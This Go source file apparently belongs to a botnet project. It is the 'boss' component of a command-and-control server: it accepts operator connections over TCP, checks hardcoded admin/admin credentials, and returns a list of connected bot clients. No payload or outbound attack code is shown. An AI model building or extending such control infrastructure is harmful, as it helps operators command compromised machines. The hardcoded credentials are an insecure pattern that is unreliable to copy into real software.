package boss

import (
	"bufio"
	"encoding/json"
	"errors"
	"log"
	"net"
	"strconv"
	"strings"

	"github.com/phanletrunghieu/botnet/server/service/client"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/botnet/common/cmd"
	"github.com/phanletrunghieu/botnet/server/domain"
)

// Service struct
type Service struct {
	listener      net.Listener
	Bosses        []*domain.Boss
	clientService *client.Service
	Error         chan error
}

// NewBossService create tcpService struct
func NewBossService(port int, clientService *client.Service) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		clientService: clientService,
		listener:      ln,
		Error:         make(chan error),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		boss := &domain.Boss{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		go s.handleConnection(boss)
	}
}

func (s *Service) authenticate(boss *domain.Boss) error {
	msg, err := bufio.NewReader(boss.Conn).ReadString('\r')
	if err != nil {
		return err
	}

	msg = strings.TrimSpace(msg)
	userInfo := strings.Split(msg, " ")
	log.Println("auth....", userInfo)
	if len(userInfo) != 2 {
		return errors.New("Fail to authenticate")
	}

	if userInfo[0] != "admin" || userInfo[1] != "admin" {
		return errors.New("Fail to authenticate")
	}

	boss.IsAuthenticated = true

	return nil
}

func (s *Service) handleConnection(boss *domain.Boss) {
	// auth
	for {
		err := s.authenticate(boss)
		if err != nil {
			boss.Conn.Write([]byte("Unauthenticated!\r"))
			s.Error <- err
		} else {
			break
		}
	}
	boss.Conn.Write([]byte("Authenticated!\r"))
	s.Bosses = append(s.Bosses, boss)

	// pass
	for {
		buffCommand := make([]byte, 2)
		_, err := boss.Conn.Read(buffCommand)
		if err != nil {
			s.Error <- err
			return
		}

		log.Println(string(buffCommand))

		switch string(buffCommand) {
		case cmd.ListBosses:
			buffClients, err := json.Marshal(s.clientService.ListClientID())
			if err != nil {
				s.Error <- err
				break
			}

			buffClients = append(buffClients, '\r')
			boss.Conn.Write(buffClients)
			if err != nil {
				s.Error <- err
				break
			}

			break
		}
	}
}
